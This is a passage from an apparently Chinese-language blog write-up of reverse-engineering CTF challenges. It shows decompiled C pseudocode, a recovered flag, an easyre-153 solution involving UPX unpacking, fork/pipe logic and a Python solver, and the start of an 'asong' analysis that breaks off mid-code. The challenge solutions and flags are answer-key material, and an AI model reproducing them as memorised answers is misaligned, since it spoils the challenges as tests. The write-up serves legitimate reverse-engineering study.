class="line">    <span class="hljs-built_in">mul</span>(v23, <span class="hljs-number">4</span>);</span><br><span class="line">    v24 = <span class="hljs-built_in">add</span>(&amp;flag[<span class="hljs-number">7</span>], <span class="hljs-number">55</span>);</span><br><span class="line">    v25 = <span class="hljs-built_in">sub</span>(v24, <span class="hljs-number">33</span>);</span><br><span class="line">    v26 = <span class="hljs-built_in">add</span>(v25, <span class="hljs-number">44</span>);</span><br><span class="line">    <span class="hljs-built_in">sub</span>(v26, <span class="hljs-number">11</span>);</span><br><span class="line">    v27 = <span class="hljs-built_in">mul</span>(&amp;flag[<span class="hljs-number">8</span>], <span class="hljs-number">10</span>);</span><br><span class="line">    v28 = <span class="hljs-built_in">sub</span>(v27, <span class="hljs-number">5</span>);</span><br><span class="line">    v29 = <span class="hljs-built_in">mul</span>(v28, <span class="hljs-number">8</span>);</span><br><span class="line">    <span class="hljs-built_in">add</span>(v29, <span class="hljs-number">9</span>);</span><br><span class="line">    v30 = <span class="hljs-built_in">add</span>(&amp;flag[<span class="hljs-number">9</span>], <span class="hljs-number">0</span>);</span><br><span class="line">    v31 = <span class="hljs-built_in">sub</span>(v30, <span class="hljs-number">0</span>);</span><br><span class="line">    v32 = <span class="hljs-built_in">add</span>(v31, <span class="hljs-number">11</span>);</span><br><span class="line">    v33 = <span class="hljs-built_in">sub</span>(v32, <span class="hljs-number">11</span>);</span><br><span class="line">    <span class="hljs-built_in">add</span>(v33, <span class="hljs-number">53</span>);</span><br><span class="line">    v34 = <span class="hljs-built_in">add</span>(&amp;flag[<span class="hljs-number">10</span>], <span class="hljs-number">49</span>);</span><br><span class="line">    v35 = <span class="hljs-built_in">sub</span>(v34, <span class="hljs-number">2</span>);</span><br><span class="line">    v36 = <span class="hljs-built_in">add</span>(v35, <span class="hljs-number">4</span>);</span><br><span class="line">    <span class="hljs-built_in">sub</span>(v36, <span class="hljs-number">2</span>);</span><br><span class="line">    v37 = <span class="hljs-built_in">mul</span>(&amp;flag[<span class="hljs-number">11</span>], <span class="hljs-number">1000000</span>);</span><br><span class="line">    v38 = <span class="hljs-built_in">sub</span>(v37, <span class="hljs-number">999999</span>);</span><br><span class="line">    v39 = <span class="hljs-built_in">mul</span>(v38, <span class="hljs-number">4</span>);</span><br><span class="line">    <span class="hljs-built_in">add</span>(v39, <span class="hljs-number">50</span>);</span><br><span class="line">    v40 = <span class="hljs-built_in">add</span>(&amp;flag[<span class="hljs-number">12</span>], <span class="hljs-number">1</span>);</span><br><span class="line">    v41 = <span class="hljs-built_in">add</span>(v40, <span class="hljs-number">1</span>);</span><br><span class="line">    v42 = <span class="hljs-built_in">add</span>(v41, <span class="hljs-number">1</span>);</span><br><span class="line">    v43 = <span class="hljs-built_in">add</span>(v42, <span class="hljs-number">1</span>);</span><br><span class="line">    v44 = <span class="hljs-built_in">add</span>(v43, <span class="hljs-number">1</span>);</span><br><span class="line">    v45 = <span class="hljs-built_in">add</span>(v44, <span class="hljs-number">1</span>);</span><br><span class="line">    v46 = <span class="hljs-built_in">add</span>(v45, <span class="hljs-number">10</span>);</span><br><span class="line">    <span class="hljs-built_in">add</span>(v46, <span class="hljs-number">32</span>);</span><br><span class="line">    v47 = <span class="hljs-built_in">mul</span>(&amp;flag[<span class="hljs-number">13</span>], <span class="hljs-number">10</span>);</span><br><span class="line">    v48 = <span class="hljs-built_in">sub</span>(v47, <span class="hljs-number">5</span>);</span><br><span class="line">    v49 = <span class="hljs-built_in">mul</span>(v48, <span class="hljs-number">8</span>);</span><br><span class="line">    v50 = <span class="hljs-built_in">add</span>(v49, <span class="hljs-number">9</span>);</span><br><span class="line">    <span class="hljs-built_in">add</span>(v50, <span class="hljs-number">48</span>);</span><br><span class="line">    v51 = <span class="hljs-built_in">sub</span>(&amp;flag[<span class="hljs-number">14</span>], <span class="hljs-number">1</span>);</span><br><span class="line">    v52 = <span class="hljs-built_in">mul</span>(v51, <span class="hljs-number">-294967296</span>);</span><br><span class="line">    v53 = <span class="hljs-built_in">add</span>(v52, <span class="hljs-number">55</span>);</span><br><span class="line">    <span class="hljs-built_in">sub</span>(v53, <span class="hljs-number">3</span>);</span><br><span class="line">    v54 = <span class="hljs-built_in">add</span>(&amp;flag[<span class="hljs-number">15</span>], <span class="hljs-number">1</span>);</span><br><span class="line">    v55 = <span class="hljs-built_in">add</span>(v54, <span class="hljs-number">2</span>);</span><br><span class="line">    v56 = <span class="hljs-built_in">add</span>(v55, <span class="hljs-number">3</span>);</span><br><span class="line">    v57 = <span class="hljs-built_in">add</span>(v56, <span class="hljs-number">4</span>);</span><br><span class="line">    v58 = <span class="hljs-built_in">add</span>(v57, <span class="hljs-number">5</span>);</span><br><span class="line">    v59 = <span class="hljs-built_in">add</span>(v58, <span class="hljs-number">6</span>);</span><br><span class="line">    v60 = <span class="hljs-built_in">add</span>(v59, <span class="hljs-number">7</span>);</span><br><span class="line">    <span class="hljs-built_in">add</span>(v60, <span class="hljs-number">20</span>);</span><br><span class="line">    v61 = <span class="hljs-built_in">mul</span>(&amp;flag[<span class="hljs-number">16</span>], <span class="hljs-number">10</span>);</span><br><span class="line">    v62 = <span class="hljs-built_in">sub</span>(v61, <span class="hljs-number">5</span>);</span><br><span class="line">    v63 = <span class="hljs-built_in">mul</span>(v62, <span class="hljs-number">8</span>);</span><br><span class="line">    v64 = <span class="hljs-built_in">add</span>(v63, <span class="hljs-number">9</span>);</span><br><span class="line">    <span class="hljs-built_in">add</span>(v64, <span class="hljs-number">48</span>);</span><br><span class="line">    v65 = <span class="hljs-built_in">add</span>(&amp;flag[<span class="hljs-number">17</span>], <span class="hljs-number">7</span>);</span><br><span class="line">    v66 = <span class="hljs-built_in">add</span>(v65, <span class="hljs-number">6</span>);</span><br><span class="line">    v67 = <span class="hljs-built_in">add</span>(v66, <span class="hljs-number">5</span>);</span><br><span class="line">    v68 = <span class="hljs-built_in">add</span>(v67, <span class="hljs-number">4</span>);</span><br><span class="line">    v69 = <span class="hljs-built_in">add</span>(v68, <span class="hljs-number">3</span>);</span><br><span class="line">    v70 = <span class="hljs-built_in">add</span>(v69, <span class="hljs-number">2</span>);</span><br><span class="line">    v71 = <span class="hljs-built_in">add</span>(v70, <span class="hljs-number">1</span>);</span><br><span class="line">    <span class="hljs-built_in">add</span>(v71, <span class="hljs-number">20</span>);</span><br><span class="line">    v72 = <span class="hljs-built_in">add</span>(&amp;flag[<span class="hljs-number">18</span>], <span class="hljs-number">7</span>);</span><br><span class="line">    v73 = <span class="hljs-built_in">add</span>(v72, <span class="hljs-number">2</span>);</span><br><span class="line">    v74 = <span class="hljs-built_in">add</span>(v73, <span class="hljs-number">4</span>);</span><br><span class="line">    v75 = <span class="hljs-built_in">add</span>(v74, <span class="hljs-number">3</span>);</span><br><span class="line">    v76 = <span class="hljs-built_in">add</span>(v75, <span class="hljs-number">6</span>);</span><br><span class="line">    v77 = <span class="hljs-built_in">add</span>(v76, <span class="hljs-number">5</span>);</span><br><span class="line">    v78 = <span class="hljs-built_in">add</span>(v77, <span class="hljs-number">1</span>);</span><br><span class="line">    <span class="hljs-built_in">add</span>(v78, <span class="hljs-number">20</span>);</span><br><span class="line">    v79 = <span class="hljs-built_in">mul</span>(&amp;flag[<span class="hljs-number">19</span>], <span class="hljs-number">1000000</span>);</span><br><span class="line">    v80 = <span class="hljs-built_in">sub</span>(v79, <span class="hljs-number">999999</span>);</span><br><span class="line">    v81 = <span class="hljs-built_in">mul</span>(v80, <span class="hljs-number">4</span>);</span><br><span class="line">    v82 = <span class="hljs-built_in">add</span>(v81, <span class="hljs-number">50</span>);</span><br><span class="line">    <span class="hljs-built_in">sub</span>(v82, <span class="hljs-number">1</span>);</span><br><span class="line">    v83 = <span class="hljs-built_in">sub</span>(&amp;flag[<span class="hljs-number">20</span>], <span class="hljs-number">1</span>);</span><br><span class="line">    v84 = <span class="hljs-built_in">mul</span>(v83, <span class="hljs-number">-294967296</span>);</span><br><span class="line">    v85 = <span class="hljs-built_in">add</span>(v84, <span class="hljs-number">49</span>);</span><br><span class="line">    <span class="hljs-built_in">sub</span>(v85, <span class="hljs-number">1</span>);</span><br><span class="line">    v86 = <span class="hljs-built_in">sub</span>(&amp;flag[<span class="hljs-number">21</span>], <span class="hljs-number">1</span>);</span><br><span class="line">    v87 = <span class="hljs-built_in">mul</span>(v86, <span class="hljs-number">1000000000</span>);</span><br><span class="line">    v88 = <span class="hljs-built_in">add</span>(v87, <span class="hljs-number">54</span>);</span><br><span class="line">    v89 = <span class="hljs-built_in">sub</span>(v88, <span class="hljs-number">1</span>);</span><br><span class="line">    v90 = <span class="hljs-built_in">add</span>(v89, <span class="hljs-number">1000000000</span>);</span><br><span class="line">    <span class="hljs-built_in">sub</span>(v90, <span class="hljs-number">1000000000</span>);</span><br><span class="line">    v91 = <span class="hljs-built_in">add</span>(&amp;flag[<span class="hljs-number">22</span>], <span class="hljs-number">49</span>);</span><br><span class="line">    v92 = <span class="hljs-built_in">sub</span>(v91, <span class="hljs-number">1</span>);</span><br><span class="line">    v93 = <span class="hljs-built_in">add</span>(v92, <span class="hljs-number">2</span>);</span><br><span class="line">    <span class="hljs-built_in">sub</span>(v93, <span class="hljs-number">1</span>);</span><br><span class="line">    v94 = <span class="hljs-built_in">mul</span>(&amp;flag[<span class="hljs-number">23</span>], <span class="hljs-number">10</span>);</span><br><span class="line">    v95 = <span class="hljs-built_in">sub</span>(v94, <span class="hljs-number">5</span>);</span><br><span class="line">    v96 = <span class="hljs-built_in">mul</span>(v95, <span class="hljs-number">8</span>);</span><br><span class="line">    v97 = <span class="hljs-built_in">add</span>(v96, <span class="hljs-number">9</span>);</span><br><span class="line">    <span class="hljs-built_in">add</span>(v97, <span class="hljs-number">48</span>);</span><br><span class="line">    v98 = <span class="hljs-built_in">add</span>(&amp;flag[<span class="hljs-number">24</span>], <span class="hljs-number">1</span>);</span><br><span class="line">    v99 = <span class="hljs-built_in">add</span>(v98, <span class="hljs-number">3</span>);</span><br><span class="line">    v100 = <span class="hljs-built_in">add</span>(v99, <span class="hljs-number">3</span>);</span><br><span class="line">    v101 = <span class="hljs-built_in">add</span>(v100, <span class="hljs-number">3</span>);</span><br><span class="line">    v102 = <span class="hljs-built_in">add</span>(v101, <span class="hljs-number">6</span>);</span><br><span class="line">    v103 = <span class="hljs-built_in">add</span>(v102, <span class="hljs-number">6</span>);</span><br><span class="line">    v104 = <span class="hljs-built_in">add</span>(v103, <span class="hljs-number">6</span>);</span><br><span class="line">    <span class="hljs-built_in">add</span>(v104, <span class="hljs-number">20</span>);</span><br><span class="line">    v105 = <span class="hljs-built_in">add</span>(&amp;flag[<span class="hljs-number">25</span>], <span class="hljs-number">55</span>);</span><br><span class="line">    v106 = <span class="hljs-built_in">sub</span>(v105, <span class="hljs-number">33</span>);</span><br><span class="line">    v107 = <span class="hljs-built_in">add</span>(v106, <span class="hljs-number">44</span>);</span><br><span class="line">    v108 = <span class="hljs-built_in">sub</span>(v107, <span class="hljs-number">11</span>);</span><br><span class="line">    <span class="hljs-built_in">add</span>(v108, <span class="hljs-number">42</span>);</span><br><span class="line">    <span class="hljs-built_in">add</span>(&amp;flag[<span class="hljs-number">26</span>], flag[<span class="hljs-number">25</span>]);</span><br><span class="line">    <span class="hljs-built_in">add</span>(&amp;flag[<span class="hljs-number">27</span>], flag[<span class="hljs-number">12</span>]);</span><br><span class="line">    v109 = flag[<span class="hljs-number">27</span>];</span><br><span class="line">    v110 = <span class="hljs-built_in">sub</span>(&amp;flag[<span class="hljs-number">28</span>], <span class="hljs-number">1</span>);</span><br><span class="line">    v111 = <span class="hljs-built_in">add</span>(v110, v109);</span><br><span class="line">    <span class="hljs-built_in">sub</span>(v111, <span class="hljs-number">1</span>);</span><br><span class="line">    v112 = flag[<span class="hljs-number">23</span>];</span><br><span class="line">    v113 = <span class="hljs-built_in">sub</span>(&amp;flag[<span class="hljs-number">29</span>], <span class="hljs-number">1</span>);</span><br><span class="line">    v114 = <span class="hljs-built_in">mul</span>(v113, <span class="hljs-number">1000000</span>);</span><br><span class="line">    <span class="hljs-built_in">add</span>(v114, v112);</span><br><span class="line">    v115 = flag[<span class="hljs-number">27</span>];</span><br><span class="line">    v116 = <span class="hljs-built_in">add</span>(&amp;flag[<span class="hljs-number">30</span>], <span class="hljs-number">1</span>);</span><br><span class="line">    <span class="hljs-built_in">mul</span>(v116, v115);</span><br><span class="line">    <span class="hljs-built_in">add</span>(&amp;flag[<span class="hljs-number">31</span>], flag[<span class="hljs-number">30</span>]);</span><br><span class="line">    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"CTF{"</span>);</span><br><span class="line">    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">32</span>; ++j)</span><br><span class="line">        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%c"</span>, <span class="hljs-built_in"><span class="hljs-keyword">char</span></span>(flag[j]));</span><br><span class="line">    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"}"</span>);</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>直接输出flag</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Your flag is:</span><br><span class="line">CTF{daf8f4d816261a41a115052a1bc21ade}</span><br></pre></td></tr></tbody></table></figure><h4 id="easyre-153"><a href="#easyre-153" class="headerlink" title="easyre-153"></a>easyre-153</h4><p>先查壳，发现是upx，脱壳</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">int</span> pipedes[<span class="hljs-number">2</span>]; <span class="hljs-comment">// [esp+18h] [ebp-38h]</span></span><br><span class="line">  <span class="hljs-keyword">__pid_t</span> v5; <span class="hljs-comment">// [esp+20h] [ebp-30h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v6; <span class="hljs-comment">// [esp+24h] [ebp-2Ch]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> buf; <span class="hljs-comment">// [esp+2Eh] [ebp-22h]</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v8; <span class="hljs-comment">// [esp+4Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readgsdword(<span class="hljs-number">0x14</span>u);</span><br><span class="line">  <span class="hljs-built_in">pipe</span>(pipedes);</span><br><span class="line">  v5 = fork();</span><br><span class="line">  <span class="hljs-keyword">if</span> ( !v5 )</span><br><span class="line">  {</span><br><span class="line">    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"\nOMG!!!! I forgot kid's id"</span>);</span><br><span class="line">    <span class="hljs-built_in">write</span>(pipedes[<span class="hljs-number">1</span>], <span class="hljs-string">"69800876143568214356928753"</span>, <span class="hljs-number">29u</span>);</span><br><span class="line">    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Ready to exit     "</span>);</span><br><span class="line">    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-built_in">read</span>(pipedes[<span class="hljs-number">0</span>], &amp;buf, <span class="hljs-number">29u</span>);</span><br><span class="line">  __isoc99_scanf(<span class="hljs-string">"%d"</span>, &amp;v6);</span><br><span class="line">  <span class="hljs-keyword">if</span> ( v6 == v5 )</span><br><span class="line">  {</span><br><span class="line">    <span class="hljs-keyword">if</span> ( (*(_DWORD *)((_BYTE *)lol + <span class="hljs-number">3</span>) &amp; <span class="hljs-number">0xFF</span>) == <span class="hljs-number">204</span> )</span><br><span class="line">    {</span><br><span class="line">      <span class="hljs-built_in">puts</span>(<span class="hljs-string">":D"</span>);</span><br><span class="line">      <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"\nYou got the key\n "</span>);</span><br><span class="line">    <span class="hljs-built_in">lol</span>(&amp;buf);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-built_in">wait</span>(<span class="hljs-number">0</span>);</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>发现用到了简单的子进程和pipe。</p><p>pipe的作用就和名字一样，建立一个管道，这个管道一端是读，一端是写，按照规定，<code>pipe[0]</code>是读，<code>pipe[1]</code>是写，然后fork了一个子进程，在子进程中，返回值为0，进入if分支通过管道写入了一个字符串，然后退出子进程。在父进程中，返回的是fork出来的子进程的id，跳过if分支，在下面读取了刚刚子进程写入的字符串，关键就是lol这个函数</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">lol</span><span class="hljs-params">(_BYTE *a1)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">char</span> v2; <span class="hljs-comment">// [esp+15h] [ebp-13h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v3; <span class="hljs-comment">// [esp+16h] [ebp-12h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v4; <span class="hljs-comment">// [esp+17h] [ebp-11h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v5; <span class="hljs-comment">// [esp+18h] [ebp-10h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v6; <span class="hljs-comment">// [esp+19h] [ebp-Fh]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v7; <span class="hljs-comment">// [esp+1Ah] [ebp-Eh]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v8; <span class="hljs-comment">// [esp+1Bh] [ebp-Dh]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="hljs-number">2</span> * a1[<span class="hljs-number">1</span>];</span><br><span class="line">  v3 = a1[<span class="hljs-number">4</span>] + a1[<span class="hljs-number">5</span>];</span><br><span class="line">  v4 = a1[<span class="hljs-number">8</span>] + a1[<span class="hljs-number">9</span>];</span><br><span class="line">  v5 = <span class="hljs-number">2</span> * a1[<span class="hljs-number">12</span>];</span><br><span class="line">  v6 = a1[<span class="hljs-number">18</span>] + a1[<span class="hljs-number">17</span>];</span><br><span class="line">  v7 = a1[<span class="hljs-number">10</span>] + a1[<span class="hljs-number">21</span>];</span><br><span class="line">  v8 = a1[<span class="hljs-number">9</span>] + a1[<span class="hljs-number">25</span>];</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">"flag_is_not_here"</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这里的处理过程非常简单，还是正向的处理，但是最后输出的是一个没用的字符串，所以即使是输入子进程的pid，也不会输出真正的flag，所以还是自己动手算出来</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">a1 = <span class="hljs-string">"69800876143568214356928753"</span></span><br><span class="line">v2 = <span class="hljs-number">2</span> * <span class="hljs-built_in">ord</span>(a1[<span class="hljs-number">1</span>])</span><br><span class="line">v3 = <span class="hljs-built_in">ord</span>(a1[<span class="hljs-number">4</span>]) + <span class="hljs-built_in">ord</span>(a1[<span class="hljs-number">5</span>])</span><br><span class="line">v4 = <span class="hljs-built_in">ord</span>(a1[<span class="hljs-number">8</span>]) + <span class="hljs-built_in">ord</span>(a1[<span class="hljs-number">9</span>])</span><br><span class="line">v5 = <span class="hljs-number">2</span> * <span class="hljs-built_in">ord</span>(a1[<span class="hljs-number">12</span>])</span><br><span class="line">v6 = <span class="hljs-built_in">ord</span>(a1[<span class="hljs-number">18</span>]) + <span class="hljs-built_in">ord</span>(a1[<span class="hljs-number">17</span>])</span><br><span class="line">v7 = <span class="hljs-built_in">ord</span>(a1[<span class="hljs-number">10</span>]) + <span class="hljs-built_in">ord</span>(a1[<span class="hljs-number">21</span>])</span><br><span class="line">v8 = <span class="hljs-built_in">ord</span>(a1[<span class="hljs-number">9</span>]) + <span class="hljs-built_in">ord</span>(a1[<span class="hljs-number">25</span>])</span><br><span class="line"></span><br><span class="line"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(v2)+<span class="hljs-built_in">chr</span>(v3)+<span class="hljs-built_in">chr</span>(v4)+<span class="hljs-built_in">chr</span>(v5)+<span class="hljs-built_in">chr</span>(v6)+<span class="hljs-built_in">chr</span>(v7)+<span class="hljs-built_in">chr</span>(v8))</span><br></pre></td></tr></tbody></table></figure><p>输出结果</p><figure class="highlight ebnf hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">rhelheg</span></span><br></pre></td></tr></tbody></table></figure><p>直接提交不对，要套上外面的格式，试了一下比赛的名称，通过。</p><h4 id="asong"><a href="#asong" class="headerlink" title="asong"></a>asong</h4><p>这题还是很考验对于算法的逆向能力的</p><p>首先IDA打开</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">main</span><span class="hljs-params">(__int64 a1, <span class="hljs-keyword">char</span> **a2, <span class="hljs-keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">void</span> *that_girl; <span class="hljs-comment">// ST00_8</span></span><br><span class="line">  <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *flag; <span class="hljs-comment">// ST08_8</span></span><br><span class="line"></span><br><span class="line">  that_girl = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xBC</span>uLL);</span><br><span class="line">  flag = (<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">80uLL</span>);</span><br><span class="line">  <span class="hljs-built_in">sub_400BBF</span>();</span><br><span class="line">  <span class="hljs-built_in">read_0</span>((__int64)flag);</span><br><span class="line">  <span class="hljs-built_in">sub_400C02</span>((__int64)flag);                   <span class="hljs-comment">// 输入的是QCTF{***}的格式，在这里取出中间的部分</span></span><br><span class="line">  <span class="hljs-built_in">readfile</span>(<span class="hljs-string">"that_girl"</span>, (__int64)that_girl);</span><br><span class="line">  <span class="hljs-built_in">sub_400E54</span>(flag, (__int64)that_girl);</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>程序流程是这样，先输入flag，然后验证格式，取中间部分，然后读取另一个文件中的内容进行一些处理，然后将输入的flag和读取出来的内容进行一个比较，输出到out里面，重点来看一下几个函数</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> __fastcall <span class="hljs-title">readfile</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *a1, __int64 a2)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">int</span> v2; <span class="hljs-comment">// eax</span></span><br><span class="line">  __int64 v4; <span class="hljs-comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> buf; <span class="hljs-comment">// [rsp+13h] [rbp-Dh]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> fd; <span class="hljs-comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> __int64 v7; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="hljs-number">0x28</span>u);</span><br><span class="line">  fd = <span class="hljs-built_in">open</span>(a1, <span class="hljs-number">0</span>, a2, a1);</span><br><span class="line">  <span class="hljs-keyword">while</span> ( <span class="hljs-built_in">read</span>(fd, &amp;buf, <span class="hljs-number">1uLL</span>) == <span class="hljs-number">1</span> )</span><br><span class="line">  {</span><br><span class="line">    v2 = <span class="hljs-built_in">sub_400936</span>(buf);</span><br><span class="line">    ++*(_DWORD *)(<span class="hljs-number">4LL</span> * v2 + v4);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-built_in">close</span>(fd);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这里明显看到进行了一个词频统计，但是看这个伪代码完全看不出来处理之后的v4和分配出来的a2有什么关联，这点在C伪代码里面不是很明显，但是在汇编里面可以看的很清楚</p><figure class="highlight plaintext hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">call    sub_400936</span><br><span class="line">cdqe</span><br><span class="line">lea     rdx, ds:0[rax*4]</span><br><span class="line">mov     rax, [rbp+var_20]</span><br><span class="line">add     rax, rdx</span><br><span class="line">mov     edx, [rax]</span><br><span class="line">add     edx, 1</span><br><span class="line">mov     [rax], edx</span><br></pre></td></tr></tbody></table></figure><p>这里其实很清楚，<code>sub_400936</code>就是我们用来处理的函数，它的返回值放到了<code>rax</code>，<code>cdqe</code>的拓展在这里可以不用考虑，差不多算是个类型转换，<code>ds:0</code>是之前分配的空间，把<code>ds:0[rax*4]</code>的地址复制进<code>rdx</code>，后面的一句并没有什么意义，将这个地址中的值赋给<code>rax</code>，就是0，<code>add</code>之后rax的值就是我们需要的地址，接下来把该地址内存的的值取出来，加一然后再放回去，这个操作逻辑很容易理解。</p><p>这个函数过后构建了一个词频表，然后进行关键的变换。</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">unsigned</span> __int64 __fastcall <span class="hljs-title">sub_400E54</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *flag, __int64 that_girl)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [rsp+18h] [rbp-48h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v4; <span class="hljs-comment">// [rsp+1Ch] [rbp-44h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v5[<span class="hljs-number">56</span>]; <span class="hljs-comment">// [rsp+20h] [rbp-40h]</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> __int64 v6; <span class="hljs-comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="hljs-number">0x28</span>u);</span><br><span class="line">  v4 = <span class="hljs-built_in">strlen</span>(flag);</span><br><span class="line">  <span 